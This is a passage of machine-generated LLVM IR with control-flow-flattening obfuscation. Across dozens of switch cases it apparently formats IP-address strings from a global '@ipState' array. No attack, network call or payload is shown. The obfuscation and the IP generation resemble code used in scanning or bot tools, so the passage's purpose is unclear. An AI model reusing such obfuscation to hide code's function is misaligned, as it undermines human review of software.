  %158 = call i32 (i8*, i8*, ...) @szprintf(i8* %153, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.199, i32 0, i32 0), i32 %155, i32 %157)
  store i32 2041092060, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i32, i32* %1, align 4
  %161 = icmp eq i32 %160, 13
  %162 = select i1 %161, i32 350551761, i32 -1226556534
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %166 = zext i8 %165 to i32
  %167 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %168 = zext i8 %167 to i32
  %169 = call i32 (i8*, i8*, ...) @szprintf(i8* %164, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.200, i32 0, i32 0), i32 %166, i32 %168)
  store i32 -1226556534, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i32, i32* %1, align 4
  %172 = icmp eq i32 %171, 14
  %173 = select i1 %172, i32 305750326, i32 -1107400740
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %176 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %177 = zext i8 %176 to i32
  %178 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %179 = zext i8 %178 to i32
  %180 = call i32 (i8*, i8*, ...) @szprintf(i8* %175, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.201, i32 0, i32 0), i32 %177, i32 %179)
  store i32 -1107400740, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %1, align 4
  %183 = icmp eq i32 %182, 15
  %184 = select i1 %183, i32 584098898, i32 157196127
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %187 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %188 = zext i8 %187 to i32
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %190 = zext i8 %189 to i32
  %191 = call i32 (i8*, i8*, ...) @szprintf(i8* %186, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i32 %188, i32 %190)
  store i32 157196127, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %1, align 4
  %194 = icmp eq i32 %193, 16
  %195 = select i1 %194, i32 -367022452, i32 1178980800
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %199 = zext i8 %198 to i32
  %200 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %201 = zext i8 %200 to i32
  %202 = call i32 (i8*, i8*, ...) @szprintf(i8* %197, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.203, i32 0, i32 0), i32 %199, i32 %201)
  store i32 1178980800, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i32, i32* %1, align 4
  %205 = icmp eq i32 %204, 17
  %206 = select i1 %205, i32 1009817214, i32 712943312
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %210 = zext i8 %209 to i32
  %211 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %212 = zext i8 %211 to i32
  %213 = call i32 (i8*, i8*, ...) @szprintf(i8* %208, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.204, i32 0, i32 0), i32 %210, i32 %212)
  store i32 712943312, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i32, i32* %1, align 4
  %216 = icmp eq i32 %215, 18
  %217 = select i1 %216, i32 137210779, i32 -1174447670
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %220 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %221 = zext i8 %220 to i32
  %222 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %223 = zext i8 %222 to i32
  %224 = call i32 (i8*, i8*, ...) @szprintf(i8* %219, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.205, i32 0, i32 0), i32 %221, i32 %223)
  store i32 -1174447670, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i32, i32* %1, align 4
  %227 = icmp eq i32 %226, 19
  %228 = select i1 %227, i32 -379501892, i32 913456409
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %231 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %232 = zext i8 %231 to i32
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %234 = zext i8 %233 to i32
  %235 = call i32 (i8*, i8*, ...) @szprintf(i8* %230, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.206, i32 0, i32 0), i32 %232, i32 %234)
  store i32 913456409, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i32, i32* %1, align 4
  %238 = icmp eq i32 %237, 20
  %239 = select i1 %238, i32 -1609370551, i32 -681818756
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %242 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %243 = zext i8 %242 to i32
  %244 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %245 = zext i8 %244 to i32
  %246 = call i32 (i8*, i8*, ...) @szprintf(i8* %241, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.207, i32 0, i32 0), i32 %243, i32 %245)
  store i32 -681818756, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i32, i32* %1, align 4
  %249 = icmp eq i32 %248, 21
  %250 = select i1 %249, i32 882696430, i32 -361802253
  store i32 %250, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %254 = zext i8 %253 to i32
  %255 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %256 = zext i8 %255 to i32
  %257 = call i32 (i8*, i8*, ...) @szprintf(i8* %252, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.208, i32 0, i32 0), i32 %254, i32 %256)
  store i32 -361802253, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %1, align 4
  %260 = icmp eq i32 %259, 22
  %261 = select i1 %260, i32 -2120744716, i32 -2090159559
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %264 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %265 = zext i8 %264 to i32
  %266 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %267 = zext i8 %266 to i32
  %268 = call i32 (i8*, i8*, ...) @szprintf(i8* %263, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.209, i32 0, i32 0), i32 %265, i32 %267)
  store i32 -2090159559, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i32, i32* %1, align 4
  %271 = icmp eq i32 %270, 23
  %272 = select i1 %271, i32 507388268, i32 -109808081
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %275 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %276 = zext i8 %275 to i32
  %277 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %278 = zext i8 %277 to i32
  %279 = call i32 (i8*, i8*, ...) @szprintf(i8* %274, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.210, i32 0, i32 0), i32 %276, i32 %278)
  store i32 -109808081, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  %281 = load i32, i32* %1, align 4
  %282 = icmp eq i32 %281, 24
  %283 = select i1 %282, i32 -786343008, i32 -1486479665
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %286 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %287 = zext i8 %286 to i32
  %288 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %289 = zext i8 %288 to i32
  %290 = call i32 (i8*, i8*, ...) @szprintf(i8* %285, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i32 %287, i32 %289)
  store i32 -1486479665, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = load i32, i32* %1, align 4
  %293 = icmp eq i32 %292, 25
  %294 = select i1 %293, i32 -407056449, i32 -1951385409
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %297 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %298 = zext i8 %297 to i32
  %299 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %300 = zext i8 %299 to i32
  %301 = call i32 (i8*, i8*, ...) @szprintf(i8* %296, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.212, i32 0, i32 0), i32 %298, i32 %300)
  store i32 -1951385409, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %1, align 4
  %304 = icmp eq i32 %303, 26
  %305 = select i1 %304, i32 301118599, i32 399590604
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %308 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %309 = zext i8 %308 to i32
  %310 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %311 = zext i8 %310 to i32
  %312 = call i32 (i8*, i8*, ...) @szprintf(i8* %307, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.213, i32 0, i32 0), i32 %309, i32 %311)
  store i32 399590604, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i32, i32* %1, align 4
  %315 = icmp eq i32 %314, 27
  %316 = select i1 %315, i32 -1986929658, i32 975134000
  store i32 %316, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %319 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %320 = zext i8 %319 to i32
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %322 = zext i8 %321 to i32
  %323 = call i32 (i8*, i8*, ...) @szprintf(i8* %318, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.214, i32 0, i32 0), i32 %320, i32 %322)
  store i32 975134000, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load i32, i32* %1, align 4
  %326 = icmp eq i32 %325, 28
  %327 = select i1 %326, i32 1592211825, i32 -714978184
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %330 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %331 = zext i8 %330 to i32
  %332 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %333 = zext i8 %332 to i32
  %334 = call i32 (i8*, i8*, ...) @szprintf(i8* %329, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.215, i32 0, i32 0), i32 %331, i32 %333)
  store i32 -714978184, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = load i32, i32* %1, align 4
  %337 = icmp eq i32 %336, 29
  %338 = select i1 %337, i32 -923321908, i32 -1962667020
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %342 = zext i8 %341 to i32
  %343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %344 = zext i8 %343 to i32
  %345 = call i32 (i8*, i8*, ...) @szprintf(i8* %340, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.216, i32 0, i32 0), i32 %342, i32 %344)
  store i32 -1962667020, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = load i32, i32* %1, align 4
  %348 = icmp eq i32 %347, 30
  %349 = select i1 %348, i32 2066843503, i32 -298176940
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %352 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %353 = zext i8 %352 to i32
  %354 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %355 = zext i8 %354 to i32
  %356 = call i32 (i8*, i8*, ...) @szprintf(i8* %351, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i32 0, i32 0), i32 %353, i32 %355)
  store i32 -298176940, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %1, align 4
  %359 = icmp eq i32 %358, 31
  %360 = select i1 %359, i32 -471001480, i32 -2097067279
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %363 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %364 = zext i8 %363 to i32
  %365 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %366 = zext i8 %365 to i32
  %367 = call i32 (i8*, i8*, ...) @szprintf(i8* %362, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.218, i32 0, i32 0), i32 %364, i32 %366)
  store i32 -2097067279, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i32, i32* %1, align 4
  %370 = icmp eq i32 %369, 32
  %371 = select i1 %370, i32 260008461, i32 1303285509
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %374 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %375 = zext i8 %374 to i32
  %376 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %377 = zext i8 %376 to i32
  %378 = call i32 (i8*, i8*, ...) @szprintf(i8* %373, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.219, i32 0, i32 0), i32 %375, i32 %377)
  store i32 1303285509, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i32, i32* %1, align 4
  %381 = icmp eq i32 %380, 33
  %382 = select i1 %381, i32 -276794767, i32 697218158
  store i32 %382, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  %384 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %386 = zext i8 %385 to i32
  %387 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %388 = zext i8 %387 to i32
  %389 = call i32 (i8*, i8*, ...) @szprintf(i8* %384, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.220, i32 0, i32 0), i32 %386, i32 %388)
  store i32 697218158, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %1, align 4
  %392 = icmp eq i32 %391, 34
  %393 = select i1 %392, i32 221157222, i32 974534782
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %396 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %397 = zext i8 %396 to i32
  %398 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %399 = zext i8 %398 to i32
  %400 = call i32 (i8*, i8*, ...) @szprintf(i8* %395, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.221, i32 0, i32 0), i32 %397, i32 %399)
  store i32 974534782, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i32, i32* %1, align 4
  %403 = icmp eq i32 %402, 35
  %404 = select i1 %403, i32 -408901051, i32 448399326
  store i32 %404, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %407 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %408 = zext i8 %407 to i32
  %409 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %410 = zext i8 %409 to i32
  %411 = call i32 (i8*, i8*, ...) @szprintf(i8* %406, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.222, i32 0, i32 0), i32 %408, i32 %410)
  store i32 448399326, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i32, i32* %1, align 4
  %414 = icmp eq i32 %413, 36
  %415 = select i1 %414, i32 1468215586, i32 1222983149
  store i32 %415, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %418 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %419 = zext i8 %418 to i32
  %420 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %421 = zext i8 %420 to i32
  %422 = call i32 (i8*, i8*, ...) @szprintf(i8* %417, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.201, i32 0, i32 0), i32 %419, i32 %421)
  store i32 1222983149, i32* %switchVar
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %424 = load i32, i32* %1, align 4
  %425 = icmp eq i32 %424, 37
  %426 = select i1 %425, i32 217318138, i32 369192407
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %430 = zext i8 %429 to i32
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %432 = zext i8 %431 to i32
  %433 = call i32 (i8*, i8*, ...) @szprintf(i8* %428, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.223, i32 0, i32 0), i32 %430, i32 %432)
  store i32 369192407, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i32, i32* %1, align 4
  %436 = icmp eq i32 %435, 38
  %437 = select i1 %436, i32 -280308085, i32 -960885864
  store i32 %437, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %440 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %441 = zext i8 %440 to i32
  %442 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %443 = zext i8 %442 to i32
  %444 = call i32 (i8*, i8*, ...) @szprintf(i8* %439, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.224, i32 0, i32 0), i32 %441, i32 %443)
  store i32 -960885864, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i32, i32* %1, align 4
  %447 = icmp eq i32 %446, 39
  %448 = select i1 %447, i32 -1815221009, i32 -549661162
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %452 = zext i8 %451 to i32
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %454 = zext i8 %453 to i32
  %455 = call i32 (i8*, i8*, ...) @szprintf(i8* %450, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.225, i32 0, i32 0), i32 %452, i32 %454)
  store i32 -549661162, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i32, i32* %1, align 4
  %458 = icmp eq i32 %457, 40
  %459 = select i1 %458, i32 -151455312, i32 -802434205
  store i32 %459, i32* %switchVar
  br label %loopEnd

; <label>:460:                                    ; preds = %loopEntry
  %461 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %462 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %463 = zext i8 %462 to i32
  %464 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %465 = zext i8 %464 to i32
  %466 = call i32 (i8*, i8*, ...) @szprintf(i8* %461, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.226, i32 0, i32 0), i32 %463, i32 %465)
  store i32 -802434205, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load i32, i32* %1, align 4
  %469 = icmp eq i32 %468, 41
  %470 = select i1 %469, i32 -1144664630, i32 -1765709412
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %474 = zext i8 %473 to i32
  %475 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %476 = zext i8 %475 to i32
  %477 = call i32 (i8*, i8*, ...) @szprintf(i8* %472, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.227, i32 0, i32 0), i32 %474, i32 %476)
  store i32 -1765709412, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = load i32, i32* %1, align 4
  %480 = icmp eq i32 %479, 42
  %481 = select i1 %480, i32 280943431, i32 -1262309983
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %484 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %485 = zext i8 %484 to i32
  %486 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %487 = zext i8 %486 to i32
  %488 = call i32 (i8*, i8*, ...) @szprintf(i8* %483, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.228, i32 0, i32 0), i32 %485, i32 %487)
  store i32 -1262309983, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i32, i32* %1, align 4
  %491 = icmp eq i32 %490, 43
  %492 = select i1 %491, i32 87349760, i32 -1795071925
  store i32 %492, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  %494 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %495 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %496 = zext i8 %495 to i32
  %497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %498 = zext i8 %497 to i32
  %499 = call i32 (i8*, i8*, ...) @szprintf(i8* %494, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.229, i32 0, i32 0), i32 %496, i32 %498)
  store i32 -1795071925, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  %501 = load i32, i32* %1, align 4
  %502 = icmp eq i32 %501, 44
  %503 = select i1 %502, i32 393178621, i32 -1041128751
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %506 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %507 = zext i8 %506 to i32
  %508 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %509 = zext i8 %508 to i32
  %510 = call i32 (i8*, i8*, ...) @szprintf(i8* %505, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.230, i32 0, i32 0), i32 %507, i32 %509)
  store i32 -1041128751, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %1, align 4
  %513 = icmp eq i32 %512, 45
  %514 = select i1 %513, i32 1997694633, i32 1901411429
  store i32 %514, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %518 = zext i8 %517 to i32
  %519 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %520 = zext i8 %519 to i32
  %521 = call i32 (i8*, i8*, ...) @szprintf(i8* %516, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.231, i32 0, i32 0), i32 %518, i32 %520)
  store i32 1901411429, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i32, i32* %1, align 4
  %524 = icmp eq i32 %523, 46
  %525 = select i1 %524, i32 1740235991, i32 -856594543
  store i32 %525, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
